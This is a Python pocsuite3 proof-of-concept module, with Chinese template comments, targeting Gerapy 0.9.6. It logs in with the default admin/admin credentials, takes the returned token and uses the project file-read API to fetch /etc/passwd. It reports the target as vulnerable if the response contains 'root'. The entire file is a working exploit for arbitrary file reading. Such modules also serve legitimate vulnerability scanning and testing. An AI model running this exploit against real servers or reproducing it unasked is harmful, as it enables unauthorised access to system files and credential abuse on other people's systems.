from collections import OrderedDict
from urllib.parse import urljoin
import re,json
import requests,urllib3
import urllib.request
import ssl
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2021-12-23'  #漏洞公开的时间,不知道就写今天
    createDate = '2021-12-23'  # 编写 PoC 的日期
    updateDate = '2021-12-23'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = ''  # PoC 名称
    appPowerLink = 'https://github.com/Gerapy/Gerapy'  # 漏洞厂商主页地址
    appName = 'Gerapy'  # 漏洞应用名称
    appVersion = '''0.9.6'''  # 漏洞影响版本
    vulType = VUL_TYPE.ARBITRARY_FILE_READ  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
    使用弱口令 admin/admin进行登录，可以在第44行代码处修改
        
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def get_token(self):
        path = "/api/user/auth"
        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
                 'Content-Type': 'application/json;charset=UTF-8'
                 }
        data = """{"username":"admin","password":"admin"}"""
        url = self.url + path
        resq = requests.post(url=url,headers=headers,data=data,timeout=5)
        return json.loads(resq.text)['token']
    def _verify(self):
        result = {}
        token = self.get_token()
        path = "/api/project/file/read"
        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
                 'Authorization': f'Token {token}'
                 }
        url = self.url + path
        data = """{"path":"/etc/", "label":"passwd"}"""
        try:
            resq = requests.post(url=url,headers=headers,data=data,timeout=5) 
            if "root" in resq.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                #result['VerifyInfo']['path'] = self.url+'/images/logo/logo-eoffice.php'
        except Exception as e:
            return
        return self.parse_output(result)

    def _attack(self):
            return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(POC)
